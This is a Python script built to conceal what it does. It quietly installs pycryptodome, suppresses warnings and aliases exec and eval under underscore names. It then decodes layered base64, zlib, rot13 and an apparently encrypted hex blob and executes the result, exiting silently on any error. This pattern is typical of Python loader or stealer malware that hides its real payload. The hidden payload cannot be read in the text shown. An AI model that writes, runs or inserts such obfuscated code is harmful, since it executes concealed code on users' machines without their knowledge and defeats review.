import random ,base64,codecs,zlib,sys;py=""
import warnings, subprocess

def check_installation(package):
    try:
        subprocess.run(["pip3", "show", package], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        return True 
    except subprocess.CalledProcessError:
        return False

package_name = "pycryptodome"

warnings.filterwarnings("ignore", category=Warning)

if not check_installation(package_name):
    subprocess.run(["pip3", "install", package_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

try:
    sys.setrecursionlimit(1000000000) 

    pyobfuscate = (lambda **kwargs: (list(kwargs.keys()),list(kwargs.values())))(**{'https://pyobfuscate.com':'EOFError is not sum','exec':'OwlMSsi04ByYHH6X8qIFb1kmZVW3gtK0Lr0i2QUTX8AZ5EOQ0KLzUOrBCXgoiD7VVQkW5dHE69zHRkWQ','eval': bytes.fromhex('''9a80ad52f0f0730808bdbe074410d1e23aa885373ac7dcbba376e9302aa8241647b89f88510cac9529ec32b82b4f95b22039d358aede3371527dac1ee444e1688ba4d69c6a5af6655d65efd2e7ee625e37e575c88351c542e381916b83e302aaf3344e14142e130151acdd02e2f5c563220ddeb05dce1b041fc68599ac3476e806802571b99cdfc139948ba694c202233e376369ef08f25c8060c76a751582165416e2137d22346d04608c90517dd5906ecf11edaf0d03647e293a26288409dad4b9f6aab07193c662cf776ec22c8b2b61fb0af3f8c51f92a2a6fac448ba2426875b1f3a0426642d13d4d984b6bd0aed1daa963f6e36c9884bdbf5003ecfec38a99e7aa0f937991dd0707896ba92b13d39502012365d17602b654c1d5460a4d70b3714eaa8bf45185e193f065a5128fe65eeb3a149f7b164206c9e7a1d2d8a13efe05ada9e2fe23bc3ffee2f9f0e62b45ea4aff7aec132a91beeb67a5dec5b48c2ff052582f01619e95b8d4f89dd924b57e4ea890bf7a91a7486ad1520ce021fa4a09791a2c30aaa840bb9cb6edca55a75e9d386059488393f8ccda3932f84badab1a5858e69d2510e941e4305afeb645c664ef92490a5b5c9c77fa87c8948992a3f980d920dbea50f300f17d6bf37466cc63ae1a91a7b3b3d8c66904570e9eb1bcab58a3003118b3777078e75f16f8d2c37a02e5aa52bd1d17f2c0cc160c32641adb828d83c05d1daa5079718485dcd24957b48659cc3a076c5d7416716dbf62cc4b9f33097dcd9324cb601958b8abbfb850be8d3798562266956a84ae5258828640b1c03a2a84edb025e403b3bfe1b688c5e7576fdbac10b877487514a53f5d69122c4ff60c49d255c472199409bd4b9342d690533d2d662f7fa368d345a6401a702fbf2bd1c5d28a79c1858dfbb00cc7c0d8f7c64a5c23b41d2f3caa9c0b999501bee93ee88566599f14a6fcda0a5420802edb91de98ba51315ef6e26584b8044286d68bc734944a95f200cb13ed8f41d8b63e365e2019b6a6f54430bc5eb5e653bfc781cc868004885db423898a60d0c15a6dc8ea7e5ac70c776ca4ed494e4b729825c8a7c9293200ed2ffb2bfd1a7d76350d6b320716fab9289564e323d828245217faca55997286466eaf458173a3d49c6bc9fa8993cfcf0d03956f950077a83f46f76b6b9612381933e7100d22005a8b1af49ae5e322255aeb722fd9eb3490edfea3ae4f994543273103a7b9bde971860b5e519e450c516b23589dbf249646e343e46985b0e6db25c2dfe7d3103c4b64244b8690f93e66555f0647e3d0e72c7399df503cdf882be152b0ad9c61f1f41c9d60bc1a194eb9a6456787c18f42e0d260330485a1ca5b1d799d384793cff509f188a045eb145dc22670606918d88e0e1dd076df60cd45104457a25ccf13e422bcaa7fb2db89c98d628efcc5a78c68faf80140fc3614eeecda62d3f70b80f8cd09620843c2f897d0018f4374ae533506245be65a96f1ac1e2b9dada8417f9e644137783ed4aa7428579591a413019d3ac006ebe283fd653409178b0f8b549d50eee9fcb8f529932c96e74d7c132e137615d69144f51a09cfefd60d9518024f6c1e51dbd0f581dd0ac76dd08b2888b746050a2f50e369db3e83e74554cfa2a02e5845c47c7eb16b3599a111971b91f9e93f68fa7209d3b91bab514c18ff24ff48f1bd38a2c4c7e6f1abf0ee98f786256bfc00773872318769d567efe8a35b0f2af46b8388bb874d06eca678786ec889305ad2b139c28f4ccd9e4a684cbc64d293701354f78c259560706dc197872ac0f9448fdb6de6fbc3bbad2ab567ff8a3f1bd5cb9027b5188bed45329794c4e671c74002de92b0d6687fcbd7706a8e75bf03fd0688a2d730b27e2ea84e76a2c6e369134c0dea38f3ee0a80c939ded2220e74ea8610a719ebc12f5fb232dbf63b48730afbcc4472765882b5e2818cd2c0f9c4f799151a659b835ce44db5976c0fc11947a5bddfc154e484bb8f9820ba65a2a103c0c32a51ffef5dea21c1aeb36560470eed55c8c921ae775222abb0363a9631186509e35afe5beb09e9b87923ba1f737b7260f79dd07c9b0126e8ddda758eba5cfc8f82317ea72f5f8178e69e785479f764417472b4d44ee81e741f759c2e3c9594d5f450f9914fa21ae7b158be62aa5dd2c49db687046ab24a8a380800e13359d961b1ae0c272fed9f6b3d655a74e95ffe2619a85ff2bc7e08be49dc74c8b16f336a1cd16a5b104ef11888fbd9ab033d6348dc1b8bd185b6e517d0d933fbb57eeff3fd6583d36f318896c3e09603493c42d6eb232a05ac69a735e15fada32ab8175ed63669072976fad569127fa43ed6af0824e7a8f8758c79109b762f84aa09677709d4882f0b13a8026e04b3b1a39bf16b5a243601444c8764fe51ecb7438ff24894ce27bb2953bfae2a0e61770790e5f17940ee38e5674586c841c30aee91ac0a3591d6c4ef3ca33db5e64cfa1c48a21012e9274685448ee3fbc7c3b44d29144ac539275cde2e94b710982df067731c3d8929199851c2f77a78e33d6484f40b73ff5155c96560dc1b2e7d2b36f621a0e61cdec205af877054b896b4e0530e054615afd864ad3e79fc1d2d9b957cba2cb20379652e520d91fe0329e7364c9c354d18886db9e8ea8dbc3f52598d5588be80d4327a7b65d8631d6d4904744f84510284cfd21238d4f389b9ef7fde5f7bac2a10ea267956d1a3596c914178ac43e456b8f1e5b886e1cd5b3fcee08e4ea3f496b2e0f953ac775a95bf06a5a6b6d72063f09557cfbf7a49855f9e02e8e4adca85722ecef52513a2cf9341ffe747079b278e5f4581f686b4e4a3a5f182246922fffd22617b8d19f23096c32823445ee096b7d8df856f816065d5b4b8e3fef0df104614af3d9d76ebbc15835f1932aff0847293d48a319d696d863f4a7a4f53deb5a93215523454458c1e2a6a6a73030bc57013f0d96930d26e68058f975f2ace7160551748f68c27460ee82663f968d1e65c0bc9fab0f2136f310c5d26b897cc04a922f9eea9e2d876004'''.replace("\n","")) })

    _=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='173340 8805560 896154 1313092 2579318 789730 639744 257568 342528 2087616 2921076 4804986 6045060 9043621 825024 10964520 165236 10846079 7787403 5794673 5243655 299744 4538705 1367584 664545 6389362 10310720 9037509 7260204 3508768 653344 4463196 3208164 8624020 519530 6131205 7261440 4221063 1381882 6542480 4191892 498104 902270 320544 1697728 3039584 634528 7135856 1776462 1987965 967780 8944064 478680 3175192 3985072 4425435 10842048 1325728 7531440 7633010 5469975 1958892 4943120 5254416 4120092 1846784 1527714 7404714 10891392 9482031 8608937 1154255 9061224 1344465 2946950 2578613 3627143 5550195 3078790 5353600 331344 10291172 812960 1380026 7764848 5969382 5929609 362135 9281650 1440224 8175344 4208490 11217200 4794167 3007092 1178912 11069300 2271948 760160 4902795 804000 5517225 1789996 1516706 741321 4934996 1758309 2770440 1351875 8995800 359760 1477189 951180 181760 3479628 8529192 1587342 5133108 934755 1248856 1406160 1704386 8452184 10446148 3049408 8412656 11119810 1758908 3089686 1021498 9698528 5677683 10506594 192276 2354874 5461560 7644050 7106616 9152823 1089820 7449457 4295710 9534888 288267 6200901 2646758 3672592 6379120 2942600 4417671 1003174 2970612 10663030 2005416 3542756 8935320 2747460 2720034 2113058 1165272 4704612 6906077 7357080 5260484 336340 755160 6032766 6132159 1203094 77220 1732608 1854816 2815872 1970496 6815538 8029362 8617818 3163834 1564512 930846 3031055 181516 3260320 5728820 1546976 9100520 740000 7965930 8766543 10715040 6323559 5994690 1169164 1185536 566711 6388440 7032795 9826175 6728000 5532075 2583136 2931146 8405350 1619872 5879917 5016720 926550 2118496 3039936 1393344 727712 2516034 6586692 7821615 4410358 524576 7927176 5657655 1877632 5866665 7819006 10541440 1572759 4490688 2847916 2985984 813185 5925367 4485488 7177060 7200490 3422826 2657632 8254118 10564705 1563744 3411772 2394104 2061576 5512698 8648630 8651875 6691857 7866824 7225944 341040 115168 2461408 1892736 2048736 6437016 6276051 95634 501054 6113256 6333811 466080 2948985 846560 1669600 4671840 3008728 4262635 98280 1889095 1744275 1755374 3454686 8880704 1578927 5198115 8601012 10791309 5382432 2436896 1595654 4111848 5106092 5949689 5632770 6470360 3818828 5255612 3011880 10668172 2981664 4272485 9900464 205650 1949682 703728 5179038 1896444 3653065 2196094 1743308 3842012 4473588 7319060 5451206 1492424 3905952 4672560 3002312 697714 1109967 5291776 2804439 1548729 5403888 10338762 925452 4092181 2829990 6361616 3835572 4719923 2463289 9747055 1062950 678454 7926048 5279280 4518432 11968 386490 631840 2649152 1818368 2263936 2380832 329700 5344494 2636032 4348252 808080 1355880 1742832 1808051 707250 5317126 1565138 226800 10811874 9121905 1697507 2532802 641890 1702592 923808 1214848 2609888 2912320 987520 675008 3024608 7376712 5365322 4477066 5118543 3318868 299768 3844560 8749328 772436 3216901 5420 2566816 1867872 1405152 1125952 8029298 868428 10079160 3219120 1489120 8910220 496680 3599520 3528112 3003650 2780497 2540772 4462943 2447928 7969170 722007 4832446 5683014 346320 1151008 1722496 2352128 2965408 1188128 3167776 2512416 966080 10928154 5252606 8128675 465090 3124050 351682 796400 6614160 960700 2179314 658690 219936 2439968 2776128 1162688 3669435 2449428 2950304 9276749 3374520 3104000 11132240 3961374 545259 3273443 358741 6605060 3092942 10152000 4178525 180083 2362166 46690 2587136 177824 2894688 689920 2751584 1276544 2648288 3129632 1765841 9990750 3758632 7037264 796352 7664772 644896 3605397 657360 1030320 10002470 897492 7808202 2996120 918064 162894 1239471 3436180 3194232 2711296 2371024 311149 1360288 1846395 7323545 251744 9497030 148480 9319876 4303024 9047570 4703754 9365265 5626116 4798106 1910240 10078830 7144092 9834324 1653440 8642562 5062500 2781030 1635326 782240 2229568 1040608 802784 809984 6763768 11433480 1505809 1679931 1201560 5953818 10601808 7089190 5075510 448280 6688304 2111000 4030997 4081580 8018874 3351685 6049211 7803900 3757400 1161571 2562172 495520 2928896 3056576 406880 171936 118670 9409362 7237560 322542 1423797 139104 11566940 2242744 507990 29472 428640 1702240 1983808 10029199 9099840 8076061 7080084 3203200 4696896 7679232 1763451 943270 890070';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJyLKi/JcnL3M3UKLDFxCizIigosMY1yrzAGAGYBCAQ=';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kMtugzAURH8pOKCGpSPiBoOjIFxj2AFteIRXWhtsf33dtOruzGikmXuzYSlZmcnZnLoZeSPBoeKp/xU5hyo26Uhe411uGID0pGPgK4LkNgPL+6IlNHwyf6tvE2Z/2ukXE47LINc4ghpuQRtv8e4/S1nNkacIhh2h54qje/+JvPcZ6JZTWC2rrOcyqCZ0cDlSghh/YFSJCbsCj+perL04JsLNrxev2MSNJYX348Hk4kZI1bkJ29+dwvao+ghCl+CiegDp8b3uHqiRizl/2I2SUN2SodlNVI8cSGe6Ptl66mUxqb3Hb/ISaoKDqkBqzeyvvgEFpGq5")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')

except Exception as e:
    exit()